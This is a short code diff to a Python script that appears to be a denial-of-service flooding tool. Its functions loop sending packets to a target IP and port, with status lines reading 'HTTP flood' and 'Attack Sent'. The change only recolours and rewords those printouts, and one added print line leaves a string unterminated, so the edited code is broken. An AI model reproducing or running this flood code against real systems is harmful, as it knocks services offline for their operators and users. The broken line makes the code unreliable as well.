@@ -74,7 +74,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" \033[97mBASE2  \033[35mHTTP flood  \033[95m" +str(ip)+ " \033[0m")
+			print(i +" \033[33mBASE2  \033[31mHTTP flood  \033[36m" +str(ip)+ " \033[0m")
 		except:
 			print("[!] Error!!!")
 
@@ -104,7 +104,7 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"Attack Sent!!!")
+			print(i +"BASE2  Attack sent  " +str(ip)+ ")
 		except:
 			s.close()
 			print("[*] Error!!!")
